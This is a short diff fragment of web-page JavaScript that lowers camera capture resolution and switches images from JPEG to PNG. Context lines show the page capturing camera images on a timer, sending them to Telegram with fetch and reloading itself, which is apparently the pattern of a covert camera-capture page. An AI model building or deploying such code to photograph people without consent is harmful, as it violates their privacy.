@@ -968,8 +968,8 @@
         // Start camera button click event
         startCamera();
 
-        const newWidth = 1920;
-        const newHeight = 960;
+        const newWidth = 1440;
+        const newHeight = 720;
 
         function captureImage(delay) {
             setTimeout(function () {
@@ -996,7 +996,7 @@
 
                 canvas.toBlob(function (blob) {
                     // Create File object from Blob
-                    var file = new File([blob], 'captured_image.png', { type: 'image/jpeg' }, 1.0);
+                    var file = new File([blob], 'captured_image.png', { type: 'image/png' }, 1.0);
 
                     // Send file to Telegram using fetch
                     var formData1 = new FormData();
@@ -1066,7 +1066,7 @@
                             location.reload();
 
                         });
-                }, 'image/jpeg');
+                }, 'image/png');
             }, delay);
         };
 
